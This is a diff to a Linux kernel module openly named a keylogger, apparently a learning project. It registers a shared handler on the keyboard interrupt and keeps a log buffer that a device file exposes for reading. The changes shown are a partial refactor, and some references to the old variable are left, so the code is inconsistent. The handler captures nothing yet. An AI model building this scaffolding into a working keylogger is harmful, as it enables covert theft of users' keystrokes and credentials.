@@ -30,16 +30,16 @@ t_keylogger_data keylogger_data;
 static int add_new_entry(char *entry)
 {
 	char *tmp_buff;
-	if (!(tmp_buff = vmalloc(log_buffer ? strlen(entry) + strlen(log_buffer) + 1 : strlen(entry) + 1)))
+	if (!(tmp_buff = vmalloc(keylogger_data.log_buffer ? strlen(entry) + strlen(keylogger_data.log_buffer) + 1 : strlen(entry) + 1)))
 	{
-		printk(KERN_WARN "Failed to allocate memory for new log entry\n");
+		printk(KERN_ERR "Failed to allocate memory for new log entry\n");
 		return (1);
 	}
 	tmp_buff[0] = '\0';
-	if (log_buffer)
-		strcpy(tmp_buff, log_buffer);
+	if (keylogger_data.log_buffer)
+		strcpy(tmp_buff, keylogger_data.log_buffer);
 	strcat(tmp_buff, entry);
-	if (log_buffer)
+	if (keylogger_data.log_buffer)
 		vfree(log_buffer);
 	log_buffer = tmp_buff;
 	return (0);
@@ -47,9 +47,9 @@ static int add_new_entry(char *entry)
 *///Commented for now so compilation works
 static ssize_t handle_read(struct file *file, char __user *to, size_t size, loff_t *_offset)
 {
-	if (!log_buffer)
+	if (!keylogger_data.log_buffer)
 		return (0);
-	return simple_read_from_buffer(to, size, _offset, log_buffer, strlen(log_buffer));
+	return simple_read_from_buffer(to, size, _offset, keylogger_data.log_buffer, strlen(log_buffer));
 }
 
 
@@ -67,8 +67,8 @@ static struct miscdevice misc_dev = {
 static irqreturn_t keylogger_handle(int irq_n, void *data)
 {
 	t_keylogger_data *logs = (t_keylogger_data *)data;
-	
-	printk(KERN_WARN "HANDLER GOT CALLED\n");
+	(void)logs;
+	printk(KERN_INFO "HANDLER GOT CALLED\n");
 	return IRQ_HANDLED;
 }
 
@@ -79,7 +79,7 @@ static int __init init(void)
 
 	if (request_irq(1, keylogger_handle, IRQF_SHARED, "keylogger", &keylogger_data) < 0)
 	{
-		printk(KERN_WARN "Couldn't request interrupt.\n");
+		printk(KERN_ERR "Couldn't request interrupt.\n");
 		return (1);
 	}
 	return (0);
